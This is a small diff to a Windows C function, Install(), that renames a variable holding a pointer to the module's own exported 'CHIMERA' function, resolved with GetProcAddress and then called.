@@ -57,10 +57,10 @@ BOOL Install()
 			if (hSelfModule)
 			{
 				typedef DWORD(_cdecl *lpCHIMERA)();
-				lpCHIMERA fnFuncKROBA = (lpCHIMERA)GetProcAddress(hSelfModule, "CHIMERA");
-				if (fnFuncKROBA)
+				lpCHIMERA fnFuncChimera = (lpCHIMERA)GetProcAddress(hSelfModule, "CHIMERA");
+				if (fnFuncChimera)
 				{
-					fnFuncKROBA();
+					fnFuncChimera();
 				}
 			}
 
